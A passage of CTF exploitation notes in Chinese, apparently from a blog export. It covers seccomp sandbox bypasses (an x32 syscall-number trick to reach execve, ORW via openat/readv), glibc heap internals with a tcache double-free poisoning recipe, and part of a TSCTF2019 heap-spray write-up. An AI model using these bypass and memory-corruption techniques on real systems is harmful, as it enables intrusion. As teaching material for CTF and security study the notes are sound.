0x40000000没有限制，那么可以利用64位下的x32漏洞，使用 64位的存器地址和 32位的地址：\n\n具体原理不太懂，应该是传参原因吧，可能syscall的系统调用号寄存器为eax，导致系统调用号0x40000003b绕过if (A < 0x40000000)检查，然后以eax传入系统调用号为0x0000003b，仍然执行了execve。\n\n这样的话在原来的系统调用号加上0x400000000即可绕过检查：\n\n```\n#注释头\n\nmov rax,59+0x40000000;\nsyscall;\n```\n\n(2)禁用evecve等函数，告诉了flag位置，或者将flag位置什么的放在了栈上(可以用peda插件：find flag)，又或者需要自己调试爆破flag的位置，不能getshell的，利用open,write,read等没有被禁用的函数进行读取：\n\n①shellcode模式：这里就根据各种规则限制来绕过，自己编写shellcode。(这个需要汇编基础，遇到题目慢慢学吧)\n\n②ROP模式：一般需要劫持栈再来ROP，其实和shellcode差不多的。这种情况一般是禁用了mprotect，所以没办法直接使用shellcode了，那么就利用ROP来搞，借助libc上的syscall。但是这里的open不知道为什么有时候执行不了，所以可以用借助syscall加上open的系统调用号来执行open。\n\n如果没有禁止mprotect，那么通常可以配合SigreturnFrame()，free_hook，setcontext来将堆上内存权限改为可执行，然后再在堆上使用shellcode也可以。\n\n▲有些禁用了open,write,read，那么其实这种情况下可以调用对应的openat，readv，和writev，其实效果一样的，因为前面三个函数其实都对应调用后面的三个函数。如果实在没办法打印，可以利用题目中的错误信息输出，修改IO_FILE来打印，读取。还有更强的用ptrace修改系统调用号，zer0pts CTF2020的sycall kit。实在找不到，后面再补坑吧。\n\n(3)控制了open,write,read的参数：\n\n```\n#注释头\n\n0000: 0x20 0x00 0x00 0x00000004 A = arch\n0001: 0x15 0x00 0x0b 0xc000003e if (A != ARCH_X86_64) goto 0013\n0002: 0x20 0x00 0x00 0x00000000 A = sys_number\n0003: 0x35 0x00 0x01 0x40000000 if (A < 0x40000000) goto 0005\n0004: 0x15 0x00 0x08 0xffffffff if (A != 0xffffffff) goto 0013\n0005: 0x15 0x06 0x00 0x00000002 if (A == open) goto 0012\n0006: 0x15 0x00 0x06 0x00000000 if (A != read) goto 0013\n0007: 0x20 0x00 0x00 0x00000014 A = fd >> 32 # read(fd, buf, count)\n0008: 0x25 0x03 0x00 0x00000000 if (A > 0x0) goto 0012\n0009: 0x15 0x00 0x03 0x00000000 if (A != 0x0) goto 0013\n0010: 0x20 0x00 0x00 0x00000010 A = fd # read(fd, buf, count)\n0011: 0x35 0x00 0x01 0x00000004 if (A < 0x4) goto 0013\n0012: 0x06 0x00 0x00 0x7fff0000 return ALLOW\n0013: 0x06 0x00 0x00 0x00000000 return KILL\n```\n\n \n\n```\n#注释头\n\n0000: 0x20 0x00 0x00 0x00000004 A = arch\n0001: 0x15 0x00 0x12 0xc000003e if (A != ARCH_X86_64) goto 0020\n0002: 0x20 0x00 0x00 0x00000000 A = sys_number\n0003: 0x35 0x00 0x01 0x40000000 if (A < 0x40000000) goto 0005\n0004: 0x15 0x00 0x0f 0xffffffff if (A != 0xffffffff) goto 0020\n0005: 0x15 0x0d 0x00 0x00000002 if (A == open) goto 0019\n0006: 0x15 0x0c 0x00 0x00000003 if (A == close) goto 0019\n0007: 0x15 0x0b 0x00 0x0000000a if (A == mprotect) goto 0019\n0008: 0x15 0x0a 0x00 0x000000e7 if (A == exit_group) goto 0019\n0009: 0x15 0x00 0x04 0x00000000 if (A != read) goto 0014\n0010: 0x20 0x00 0x00 0x00000014 A = fd >> 32 # read(fd, buf, count)\n0011: 0x15 0x00 0x08 0x00000000 if (A != 0x0) goto 0020\n0012: 0x20 0x00 0x00 0x00000010 A = fd # read(fd, buf, count)\n0013: 0x15 0x05 0x06 0x00000000 if (A == 0x0) goto 0019 else goto 0020\n0014: 0x15 0x00 0x05 0x00000001 if (A != write) goto 0020\n0015: 0x20 0x00 0x00 0x00000014 A = fd >> 32 # write(fd, buf, count)\n0016: 0x15 0x00 0x03 0x00000000 if (A != 0x0) goto 0020\n0017: 0x20 0x00 0x00 0x00000010 A = fd # write(fd, buf, count)\n0018: 0x15 0x00 0x01 0x00000001 if (A != 0x1) goto 0020\n0019: 0x06 0x00 0x00 0x7fff0000 return ALLOW\n0020: 0x06 0x00 0x00 0x00000000 return KILL\n```\n\n类似这种限制fd的，可以先close再open，改变fd，同样对应参数也可以适当做一些修改来绕过。\n\n \n\n参考资料：\n\n[seccomp沙盒逃逸基础——沙盒的规则编写 - p0lar1s - 博客园 (cnblogs.com)](https://www.cnblogs.com/p0lar1s/p/14697070.html#基于bpf伯克利分组过滤器的seccomp库函数)\n\n[(*´∇｀*) 被你发现啦~ seccomp学习笔记 | A1ex's Blog](https://a1ex.online/2020/09/27/seccomp学习笔记/)\n\n[PWN题中常见的seccomp绕过方法 - 安全客，安全资讯平台 (anquanke.com)](https://www.anquanke.com/post/id/219077#h2-0)\n\n[Seccomp从0到1 - 安全客，安全资讯平台 (anquanke.com)](https://www.anquanke.com/post/id/208364#h2-10)\n\n等等，贴不过来了。\n","tags":["ORW-Skill"],"categories":["ORW"]},{"title":"堆前置知识总结","url":"/2021/08/19/堆前置知识总结/","content":"\n# 一、main_arena总概\n\n## 1.arena:\n\n堆内存本身\n\n### (1)主线程的main_arena:\n\n由sbrk函数创建。\n\n- 最开始调用sbrk函数创建大小为(128 KB + chunk_size) align 4KB 的空间作为 heap\n\n- 当t不够用时，用sbrk或者mmap增加heap大小。\n\n### (2)其它线程的per thread arena:\n\n由mmap创建。\n\n- 最开始调用 mmap 映射一块大小为HEAP_MAX_SIZE（32 位系统上默认为 1MB，64 位系统上默认为 64MB）的空间作为 sub-heap。\n\n- 当不够用时，会调用 mmap 映射一块新的 sub-heap，也就是增加 top chunk 的大小，每次 heap 增加的值都会对齐到4KB。\n\n## 2.malloc_state:\n\n管理arena的一个结构，包括堆状态信息，bins链表等等\n\n### (1)main_arena\n\n对应的malloc_state结构的全局指针存储在glibc的全局变量中\n\n(如果可以泄露malloc_state结构体的地址，那么就可以泄露glibc的地址)\n\n### (2)per thread arena\n\n对应的malloc_state存储在各自本身的arena\n\n## 3.bins:\n\n用链表结构管理空闲的chunk块，通过free释放进入的chunk块(垃圾桶)\n\n## 4.chunks:\n\n一般意义上的堆内存块\n\n```c\n#注释头\n\nstruct malloc_state{\nmutex_t mutex;//(相当于多线程的互斥锁)\nint flags;//(记录分配器的一些标志，bit0 用于标识分配区是否包含至少一个 fast bin chunk，bit1 用于标识分配区是否能返回连续的虚拟地址空间。)\nmfastbinptr fastbinsY[NFASTBINS];//(一个数组，里面的元素是各个不同大小的fastbins的首地址)\nmchunkptr top;//(top chunk的首地址)\nmchunkptr last_remainder;//(某些情况下切割剩下来的堆块)\nmchunkptr bins[NBINS*2-2];\n.......................................................\nunsigned int binmap[BINMAPSIZE];//(以bit为单位的数组，共128bit，16个字节，4个int，由于bin的数量为128，对于这里面的128bit，为0表该bin没用有空闲块，为1表有空闲块。通过四个int的大小可以找出不同index的bin中是否有空闲块。这个在某些时候会用到。)\n......//后面还有，不太重要\n}\n```\n\n▲内存中的堆情况：\n\n全局变量glibc:main_arena = struct malloc_state:\n\n| mutes | bin  | ..... | top  | lastremainder |\n| ----- | ---- | ----- | ---- | ------------- |\n|       |      |       |      |               |\n\n \n\n| Allocated chunk | Allocated chunk | Freechunk1 | Allocated chunk | Freechunk2 | Allocated chunk | Topchunk |\n| --------------- | --------------- | ---------- | --------------- | ---------- | --------------- | -------- |\n|                 |                 |            |                 |            |                 |          |\n\n低地址------------------------------------------------------------- ------------------>高地址\n\n由sbrk创建的main_arena:\n\n- 可以把bin也当作一个chunk，不同Bins管理结构不同，有单向链表管理和双向链表管理。\n\n- top里的bk保存Topchunk的首地址。\n\n(bk和fd只用于Bins链表中，allocated_chunk中是属于用户可以使用的内容)\n\n \n\n \n\n \n\n# 二、chunk结构：\n\n## 1.chunk状态\n\n### (1)allocated_chunk：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs1.png)\n\n### (2)free_chunk:\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs2.png)\n\n## 2.prev_size：\n\n8字节，保存前一个chunk的大小，在allocatedchunk中属于用户数据，参考上述的图片，free_chunk的下一个chunk的pre_size位为该free_chunk的size。\n\n## 3.size:\n\n### (1)size含义\n\n8字节，保存当前chunk大小。(free和allocated都有用)一个chunk的size以0x10递增，以0x20为最小chunk。\n\n- malloc(0x01)：会有0x20这么大，实际用户可用数据就是0x18。size=0x21\n\n- malloc(0x01-0x18)：仍然0x20这么大，实际用户可用数据就是0x18。size=0x21\n\n- malloc(0x18)：会有0x30这么大，实际用户可用数据是0x28。size=0x31\n\n所以size这个8字节内存的最低4位都不会被用到，所以malloc管理机制给最低的3位搞了个特殊形式标志位，A,M,P，分别代表不同内容。\n\n### (2)AMP标志位\n\n#### ①A:NON_MAIN_ARENA\n\n代表是否属于非main_arena，1表是，0表否。就是线程的不同。\n\n```c\n#注释头\n\n#define chunk_non_main_arena(p) ((p)->size & NON_MAIN_ARENA)\n```\n\n#### ②M:IS_MMAPPED\n\n代表当前chunk是否是mmap出来的。\n\n```c\n#注释头\n\n#define chunk_is_mmapped(p) ((p)->size & IS_MMAPPED)\n```\n\n#### ③P:PREV_INUSE\n\n代表前一个chunk是否正在被使用，处于allocated还是free。\n\n```c\n#注释头\n\n#define prev_inuse(p) ((p)->size & PREV_INUSE)\n```\n\n(标志位为1都代表是，0都代表否)\n\n \n\n# 三、bins结构：\n\n## 1.fastbins\n\n放在struct malloc_state中的mfastbinptr fastbinsY[NFASTBINS]数组中。\n\n### (1)归类方式：\n\n只使用fd位\n\n- bin的index为1，bins[0],bins[1]组成一个bin。\n\n- 规定大小的chunk归到一类，但个数有限，不同版本不同，同时也可以设置其范围：\n\nM_MXFAST即为其最大的参数，可以通过 mallopt()进行设置，但最大只能是80B。\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs3.jpg)\n\n### (2)单向链表：\n\n▲例子：a=malloc(0x10); b=malloc(0x10); c=malloc(0x10); d=malloc(0x10)\n\nFastbinY,d,c,b,a\n\n- free(a)之后：\n\n```c\n#注释头\n\nfastbinY[0x20]->a;       a.fd=0\n```\n\n- free(b)之后：\n\n```c\n#注释头\n\nfastbinY[0x20]->b;       b.fd=a       a.fd=0\n```\n\n- free(c)之后：\n\n```c\n#注释头\n\nfastbinY[0x20]->c;        c.fd=b       b.fd->a;    a.fd=0\n```\n\n- free(d)之后：\n\n```c\n#注释头\n\nfastbinY[0x20]->d;       d.fd=c       c.fd->b;     b.fd->a;    a.fd=0\n```\n\n### (3)后进先出：\n\n- m=malloc(0x10):      m->d\n\n- n=malloc(0x10):      n->c\n\n### (4)IN_USE位:\n\n如果某个chunk进入到fastbin中，那么该chunk的下一个chunk的IN_USE位还是为1，不会改变成0。\n\n例子：a=malloc(0x10); b=malloc(0x10); c=malloc(0x10);\n\n- free(a)之后:     b.p=1\n\n- free(b)之后：   c.p=1;   b.p=1\n\np位不会变成0，如果该chunk进入到fastbins中。\n\n可以进行free(0),free(1),free(0)，但是不能直接free(0)两次。\n\n### (5)注意\n\n除了`malloc_consolidate`函数会清空fastbins，以及在tcache下存在`fastbin_reverseTo_tcache`外，其它的操作都不会减少fastbins中chunk的数量。\n\n \n\n \n\n## 2.smallbins:\n\n放在bins[2]-bins[125]中，共计62组，是一个双向链表。最大chunk的大小不超过1024字节\n\n### (1)归类方式：\n\n- 相同大小的chunk归到一类：大小范围[0x20,0x3f0]，0x20、0x30、....0x3f0。每组bins中的chunk大小一定。\n\n- 每组bin中的chunk大小有如下关系：Chunk_size=2 * SIZE_SZ * index，index即为2-63，下图中64即为largebins的范围了。(SIZE_SZ在32，64位下分别位4，8。)\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs4.jpg)\n\n### (2)双向链表：\n\n▲例子：a=malloc(0x100); b=malloc(0x100); c=malloc(0x100)\n\n- free(a)之后:      smallbin,a\n\n```c\n#注释头\n\nsmallbin.bk->a;         a.bk->smallbin;      \nsamllbin.fd->a          a.fd->smallbin;\n```\n\n- free(b)之后:    smallbin,b,a\n\n```c\n#注释头\n\nsmallbin.bk->a;       a.bk->b    b.bk->smallbin\nsmallbin.fd->b;       b.fd->a    a.fd->smallbin\n```\n\n- free(c)之后：   smallbin,c,b,a\n\n```c\n#注释头\n\nsmallbin.bk->a;       a.bk->b    b.bk->c    c.bk->smallbin\nsmallbin.fd->c;       c.fd->b    b.fd->a    a.fd->smallbin\n```\n\n（fd,bk为bins[n]，bins[n+1]。fd和bk共同构成一个Binat。）\n\n### (3)先进先出：\n\n- m=malloc(0x100):         m->a\n\n- n=malloc(0x100):         n->b\n\n \n\n \n\n## 3.largebins\n\n放在bins[126]-bins[251]，共计63组，bin的index为64-126，最小chunk的大小不小于1024个字节。\n\n### (1)归类方式：\n\n范围归类，例如bins[126]-bins[127]中保存chunk范围在[0x400,0x440]。且chunk在一个bin中按照从大到小排序，便于检索。其它与smallbins基本一致。\n\n#### ①范围模式：\n\n由以下代码定义范围：\n\n```c\n#注释头\n\n#define largebin_index_64(sz)                                               \n  (((((unsigned long) (sz)) >> 6) <= 48) ?  48 + (((unsigned long) (sz)) >> 6) :\n   ((((unsigned long) (sz)) >> 9) <= 20) ?  91 + (((unsigned long) (sz)) >> 9) :\n   ((((unsigned long) (sz)) >> 12) <= 10) ? 110 + (((unsigned long) (sz)) >> 12) :\n   ((((unsigned long) (sz)) >> 15) <= 4) ? 119 + (((unsigned long) (sz)) >> 15) :\n   ((((unsigned long) (sz)) >> 18) <= 2) ? 124 + (((unsigned long) (sz)) >> 18) :\n   126)\n```\n\n#### ②范围具体实例：\n\n```c\n#注释头\n\nsize                           index\n[0x400 , 0x440)                64\n[0x440 , 0x480)                65\n[0x480 , 0x4C0)                66\n[0x4C0 , 0x500)                67\n[0x500 , 0x540)                68\n等差 0x40      …\n[0xC00 , 0xC40)                96\n[0xC40 , 0xE00)                97\n[0xE00 , 0x1000)               98\n[0x1000 , 0x1200)              99\n[0x1200 , 0x1400)              100\n[0x1400 , 0x1600)              101\n等差 0x200    …\n[0x2800 , 0x2A00)              111\n[0x2A00 , 0x3000)              112\n[0x3000 , 0x4000)              113\n[0x4000 , 0x5000)              114\n等差 0x1000 …\n[0x9000 , 0xA000)              119\n[0xA000 , 0x10000)             120\n[0x10000 , 0x18000)            121\n[0x18000 , 0x20000)            122\n[0x20000 , 0x28000)            123\n[0x28000 , 0x40000)            124\n[0x40000 , 0x80000)            125\n[0x80000 , …. )                126\n```\n\n### (2)双向链表：\n\n#### ①取用排列：\n\n首先依据fd_nextsize，bk_nextsize两个指针大小找到适合的，然后按照正常的FIFO先进先出原则，通过fd,bk来排列。\n\n#### ②大小排列：\n\n每个进入largebin的chunk\n\n其chunk_addr+0x20处即为其fd_nextsize指针，chunk_addr+0x28处为其bk_nextsize指针。\n\n然后通过fd_nextsize，bk_nextsize两个指针依据从大至小的顺序排列：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs5.png)\n\n(这张图片我也忘记从哪里整的了...侵删)\n\n其中size顺序为：D>C>B>A，但是释放顺序却不一定是这样的。设置这个的原因是当申请特定大小的堆块时，可以据此来快速查找，提升性能。\n\n### (3)特殊解链：\n\n由于largebin中会存在fd_nextsize指针和bk_nextsize指针，所以通常的largebin_attack就是针对这个进行利用的。\n\n借用星阑科技的一张图说明一切：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs6.jpg)\n\n \n\n \n\n## 4.unsortedbins\n\nbins[0]和bins[1]中，bins[0]为fd，bins[1]为bk，bin的index为1，双链表结构。\n\n### (1)归类方式：\n\n只有一个bin，存放所有不满足fastbin，未被整理的chunk。\n\n### (2)双向链表：\n\na=malloc(0x100); b=malloc(0x100); c=malloc(0x100)\n\n- free(a)之后:      unsortedbin,a\n\n```c\n#注释头\n\nunsortedbin.bk->a;  a.bk->unsortedbin;\nunsortedbin.fd->a;  a.fd->unsortedbin;\n```\n\n- free(b)之后:    unsortedbin,b,a\n\n```c\n#注释头\n\nunsortedbin.bk->a;  a.bk->b     b.bk->unsortedbin\nunsortedbin.fd->b;  b.fd->a     a.fd->unsortedbin\n```\n\n- free(c)之后：   unsortedbin,c,b,a\n\n```c\n#注释头\n\nunsortedbin.bk->a;  a.bk->b     b.bk->c     c.bk->unsortedbin\nunsortedbin.fd->c;  c.fd->b     b.fd->a     a.fd->unsortedbin\n```\n\n### (3)先进先出：\n\n- m=malloc(0x100):         m->a\n\n- n=malloc(0x100):         n->b\n\n▲依据fd来遍历：\n\n如果fd链顺序为A->B->C\n\n那么解链顺序一定是先解C，再解B，再解A。\n\n \n\n \n\n \n\n## 5、Tcache机制：\n\n从libc-2.26及以后都有:先进后出，最大为0x410\n\n### (1)结构：\n\n#### ①2.29以下\n\n无key字段的tcache，结构大小为0x240，包括chunk头则占据0x250:\n\n```c\n#注释头\n\ntypedef struct tcache_perthread_struct\n{\n  char counts[TCACHE_MAX_BINS];//0x40\n  tcache_entry *entries[TCACHE_MAX_BINS];//0x40\n} tcache_perthread_struct;\n```\n\n##### counts:\n\n是个数组，总共64个字节，对应tcache的64个bin，每个字节代表对应bin中存在chunk的个数，所以每个字节都会小于8，一般使用\n\n```c\n#注释头\n\ntc_idx = csize2tidx (size);\ntcache->counts[tc_idx]\n```\n\n来访问索引对应bin的count。\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-08-08_23-01-51.png)\n\n从0x55555555b010至0x55555555b04f都是counts这个数组的范围。\n\n▲由于使用tcache时，不会检查tcache->counts[tc_idx]的大小是否处在[0,7]的范围，所以如果我们可以将对应bin的count改成[0,7]之外的数，这样下回再free该bin对应大小的chunk时，就不会将该chunk置入tcache中，使得tcache不满也能不进入tcache。\n\nB.entries：是个bin指针数组，共64个指针数组，每个指针8个字节，总计大小0x200字节，指针指向对应的bin中第一个chunk的首地址，这个首地址不是chunk头的首地址，而是对应数据的首地址。如果该bin为空，则该指针也为空。一般会使用tcache->entries[tc_idx] != NULL来判断是否为空。\n\n \n\n#### ②2.29及以上\n\n在entry中增加了key字段，结构体大小为0x290，count由原来的一个字节变为两个字节\n\n```c\n#注释头\n\ntypedef struct tcache_entry\n{\n  struct tcache_entry *next;\n  /* This field exists to detect double frees.  */\n  struct tcache_perthread_struct *key; /* 新增指针 */\n} tcache_entry;\n```\n\n### (2)个数\n\n类似于一个比较大的fastbins。总共64个bin。\n\n### (3)归类方式：\n\n相同大小的chunk归到一类：大小范围[0x20,0x410]。每组bins中的chunk大小一定。且一组bin中最多只能有7个chunk，如果free某大小bin的chunk数量超过7，那么多余的chunk会按照没有tcache机制来free。\n\n### (4)单向链表：\n\n▲例子：a=malloc(0x10); b=malloc(0x10); c=malloc(0x10); d=malloc(0x10)\n\nFastbinY,d,c,b,a\n\n- free(a)之后：tcachebins[0x20]->a;  a.fd=0\n\n- free(b)之后：tcachebins[0x20]->b;  b.fd=a   a.fd=0\n\n- free(c)之后：tcachebins[0x20]->c;  c.fd=b    b.fd->a;  a.fd=0\n\n- free(d)之后：tcachebins[0x20]->d;  d.fd=c    c.fd->b;  b.fd->a;  a.fd=0\n\n★但是这里的fd指向的是chunk内容地址，而不是其它的bins中的fd指向的是chunk头地址。\n\n### (5)后进先出\n\n与fastbins类似。且tcache的优先级最高。\n\n### (6)特殊：\n\n- 当tcache某个bin被填满之后，再free相同大小的bin放到fastbin中或者smallbins中，之后连续申请7个该大小的chunk，那么tcache中的这个bin就会被清空。之后再申请该大小的chunk就会从fastbins或者smallbins中找，如果找到了，那么返回该chunk的同时，会将该大小的fastbin或者smallbin中所有的chunk都移动到对应大小的tcache的bin中，直至填满7个。(移动时仍旧遵循先进后出的原则，所以移动之后chunk顺序会发生颠倒)\n\n- libc-2.26中存在tcache poisoning漏洞，即可以连续free(chunk)多次。\n\n假如chunk0,chunk1，然后free(chunk0)两次，这样tcache bin中就是：\n\n```\nchunk0.fd ->chunk0，即chunk0->chunk0\n```\n\n那么第一次申请回chunk0，修改fd为fakechunk，tcache bin中就是：\n\n```\nchunk0.fd->fakechunk，即chunk0->fakechunk\n```\n\n之后再申请回chunk0，再申请一次就是fakechunk了，实现任意地址修改。\n\n★这个漏洞在libc2.27中就被修复了。\n\n- 从tcache中申请Chunk的时候不会检查size位，不需要构造字节错位。\n\n### (7)2.31下新增stash机制：\n\n在 Fastbins 处理过程中新增了一个 Stash 机制，每次从 Fastbins 取 Chunk 的时候会把剩下的 Chunk 全部依次放进对应的 tcache，直到 Fastbins 空或是 tcache 满。\n\n### (8)2.32下新增fd异或机制：\n\n会将fd异或上某个值，这个具体看其他文章吧。\n\n \n\n \n\n \n\n## 6.Topchunk:\n\n不属于任何Bin，在arena中属于最高地址，没有其它空闲块时，topchunk就会被用于分配。\n\n \n\n \n\n## 7.last_remainder:\n\n当请求small chunk大小内存时，如果发生分裂，则剩余的chunk保存为last_remainder，放入unsortedbin中。\n\n \n\n \n\n\n\n▲没有tcache的malloc和free流程：\n\n# 四、malloc流程：\n\n★如果是多线程情况下，那么会先进行分配区的加锁，这里就可能存在条件竞争漏洞。\n\n- 如果size在fastbins的范围内，则先在fastbins中查找，找到则结束，没找到就去unsortedbins中找。\n\n- 如果size不在fastbins范围中，而在smallbins范围中，则查找smallbins（在2.23下如果发现smallbin链表未初始化，则会调用**malloc_consolidate**函数，但是实际情况在申请chunk之前都已经初始化过了，所以这个不怎么重要\n\n  ```\n  if (victim == 0) /* initialization check */ malloc_consolidate (av); \n  ```\n\n  而且这个操作从2.27开始已经没有了，如果能够让smallbin不初始化，或者将main_arena+0x88设置为0），此时若smallbin找到结束，没找到去unsortedbins中找\n\n- 如果size不在fastbins，smallbins范围中，那一定在largebins中，那么先调用**malloc_consolidate**函数将所有的fastbin中的chunk取出来，合并相邻的freechunk，放到unsortedbin中，或者与topchunk合并。再去largebins中找，找到结束，没找到就去unsortedbins中找。\n\n- unsortedbins中查找：\n  - 如果unsortedbin中只有last_reaminder，且分配的size小于last_remainder，且要求的size范围为smallbin的范围，则分裂，将分裂之后的一个合适的chunk给用户，剩余的chunk变成新的last_remainder进入unsortedbin中。如果大于last_remainder，或者分配的size范围为largebin的范围，则将last_remainder整理至对应bin中，跳至第5步。\n  - 如果unsortedbin中不只一个chunk，则先整理，遍历unsortedbins。如果遇到精确大小，直接返回给用户，接着整理完。如果一直没遇到过，则该过程中所有遇到的chunk都会被整理到对应的fastbins，smallbins，largebins中去。\n\n- unsortedbins中找不到，则：\n  - 若当前size最开始判断是处于smallbins范围内，则再去smallbins找，这回不找精确大小，找最接近略大于size的一个固定大小的chunk给分裂，将符合size的chunk返回给用户，剩下的扔给unsortedbins，作为新的last_remainder。\n  - 若当前size最开始判断处于largebins范围内，则去largebins中找，和步骤(1)类似。\n  - 若当前size大于largebins中最大的chunk大小，那么就去topchunk来分割使用。\n\n- topchunk分割：\n  - topchunk空间够，则直接分割。\n  - topchunk空间不够，那么再调用malloc_consolidate函数进行整理一下，然后利用brk或者mmap进行再拓展。\n    - brk扩展：当申请的size小于128K时，使用该扩展。向高地址拓展新的topchunk，一般加0x21000，之后从新的topchunk再分配，旧的topchun进入unsortedbin中。\n    - mmap扩展：申请的size大于等于mmap分配阈值(最开始为128k)时，使用该扩展，但是这种扩展申请到的chunk，在释放时会调用munmap函数直接被返回给操作系统，而不会进入bins中。所以如果用指针再引用该chunk块时，就会造成segmentation fault错误。\n\n▲当ptmalloc munmap chunk时，如果回收的chunk空间大小大于mmap分配阈值的当前值，并且小于DEFAULT_MMAP_THRESHOLD_MAX（32位系统默认为512KB，64位系统默认为32MB），ptmalloc会把mmap分配阈值调整为当前回收的chunk的大小，并将mmap收缩阈值（mmap trim threshold）设置为mmap分配阈值的2倍。这就是ptmalloc的对mmap分配阈值的动态调整机制，该机制是默认开启的，当然也可以用mallopt()关闭该机制\n\n▲如果将 M_MMAP_MAX 设置为 0，ptmalloc 将不会使用 mmap 分配大块内存。\n\n \n\n# 五、free流程：\n\n★多线程情况下，free()函数同样首先需要获取分配区的锁，来保证线程安全。\n\n- 首先判断该chunk是否为mmaped chunk，如果是，则调用 munmap()释放mmaped chunk，解除内存空间映射，该该空间不再有效。同时满足条件则调整mmap阈值。\n\n- 如果size位于fastbins范围内，直接放到fastbins中。\n\n- 如果size不在fastbins范围内，则进行判断：\n  - 先判断前一个chunk_before，如果chunk_before是free状态的，那么就将前一个chunk从其对应的bins中取出来(unlink)，然后合并这两个chunk和chunk_before。由于还没有进入链表结构中，所以这里寻找chunk_before地址是通过当前地址减去当前chunk的presize内容，得到chunk_before的地址，从而获取其in_use位。\n  - 这也是presize唯一的用途，所以在堆溢出中，只要不进行free，presize可以任意修改。(这里如果chunk_before是位于fastbins中则没办法合并，因为在fastbins中的in_use位不会被改变，永远是1，在判断时始终认为该chunk是处于allocated状态的)\n  - 再判断后一个chunk，如果后一个chunk是free状态，那么如步骤(1)，合并，之后将合并和的chunk放入到unsortedbins中去。如果后一个chunk就是topchunk，那么直接将这个chunk和topchunk合并完事。\n  - 之后将合并之后的chunk进行判断，(这里也可能不发生合并，但依旧会进行判断)如果size大于`FASTBIN_CONSOLIDATION_THRESHOLD`(0x10000)，那么就调用**malloc_consolidate**函数进行整理fastbins，然后给到unsortedbins中，等待malloc时进行整理。\n\n \n\n▲32位与64位区别，差不多其实，对于0x8和0x10的变化而已：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs1.jpg)\n","tags":["Heap-Knowledge"],"categories":["PWN","pwn堆"]},{"title":"TSCTF2019 薛定谔的堆块-HeapSpray","url":"/2021/08/18/TSCTF2019 薛定谔的堆块-HeapSpray/","content":"\nheapspray有很多的应用场景，但大多都是windows下的漏洞应用，关于Glibc的比较少，至今只看见两题：\n\n[pwnhub.cn 故事的开始 calc](https://atum.li/2016/12/05/calc/)\n\n[TSCTF2019 薛定谔的堆块](https://www.anquanke.com/post/id/206484)\n\n这里参考第二篇文章针对第二题做个复现，理解下堆喷的思想。\n\n## 1.函数理解\n\n这里分析起来比较麻烦，最好就调试，直接给出相关的功能：\n\n### (1)Create函数：\n\n- 创建chunk，但每次Create会创建0x10个相同大小的chunk，且大小为输入size+4。比如输入size为0xc，那么创建的chunk就是0x10个0x18大小的Chunk。同时每0x10个小chunk在宏观意义上组成一个大chunk，这里用SmallChunk和BigChunk区分一下。\n\n- chunk的索引在全局数组dword_4060，chunkList中随机排列，比如idx为0的chunk不一定是第一个创建的。\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-08-10_21-46-26.png)\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-08-10_21-49-21.png)\n\n这点在后面堆喷会用到，无法简单地通过打印值来判断heap地址，只能判断出在哪个BigChunk中，还得判断出某个SmallChunk在BigChunk中的位置才能泄露出堆地址。\n\n- 创建chunk读取数据时read_str函数里有\\x00截断，所以Display在没有UAF的情况下难以泄露出地址，这里也不存在堆溢出。\n\n- 选择chunk类型时会给chunk_addr+size处赋值，这里就是之前申请size+4的原因。\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-08-10_21-56-19.png)\n\n这个赋予的值是一个ELF上的data数据地址，没啥用，迷惑用的，同时如果选择的选项不为1-4的话，就会不赋值，这个在后面很有用。\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-08-10_21-58-56.png)\n\n### (2)Display函数：\n\n比较常规，输出给定index范围的SmallChunk的内容\n\n### (3)Delete函数：\n\n删除最后一次Create的BigChunk的所有SmallChunk，free数据且置指针NULL，没啥漏洞。但是这里删除是依据chunkList的顺序索引删除，而chunkList又是被打乱的，所以删除之后的顺序其实不是我们最开始输入数据的顺序，这个在后面unsortedbin泄露数据的时候需要注意一下。\n\n### (4)Modify函数：\n\n编辑指定index的Small Block的内容，这里没啥用\n\n### (5)CallFunction函数：\n\n根据Create时的最后那4byte的数值来决定执不执行某个函数指针(这个函数指针就是最开始创建的时候赋值的ELF上的数据)。\n\n- *(chunk_addr+size) != 0，则set *(*(chunk_addr+size)) -= 1\n\n- *(chunk_addr+size) == 0，则jmp *(*(chunk_addr+size))+0x4\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-08-10_23-06-41.png)\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-08-10_23-07-14.png)\n\n这里调用CallFunction函数之后就可以调用到0xf7e87401，这里的*0x57d1ab8c是我们在堆上设置好的内容。\n\n## 2.漏洞发现：\n\n这里就结合Create函数，利用先申请填充内容之后再释放，使得`*(chunk_addr+size)`可控，从而能够调用任意函数。但是在保护全开的情况下想要调用函数，必须需要泄露地址，而地址在没有漏洞的情况下又没办法泄露。\n\n堆喷原理：https://www.cnblogs.com/Fang3s/articles/3911561.html\n\n### (1)堆喷结合CallFunction函数的-1泄露地址：\n\n假设某个堆地址：magic_addr。由于这里可以Display，所以如果`*magic_addr= magic_addr-1`，而利用堆喷使得一定范围内的堆内容都为magic_addr，打印内容之后，就可以依据打印的内容，能够从中筛选出magic_addr，获取其索引，再经过我们制造堆喷过程中运算就能得到开始堆喷的地址start_addr。\n\n比如：magic_addr = 0x58585858，申请了0x100个0x20000大小的Chunk，那么得到索引为0x58，且magic_addr 也是一个0x20000的chunk，就可求得start_addr为0x58585858-0x58*0x20000。当然这是理论上的，实际还得一系列的判断运算。\n\n同理，在当我们释放堆块进入unsortedbin之后，踩下main_arena地址再申请回来，由于\\x00截断很难泄露出地址，这里也是采用这个方法，使得\\x00-1成为0xff来把\\x00截断给抹杀。\n\n### 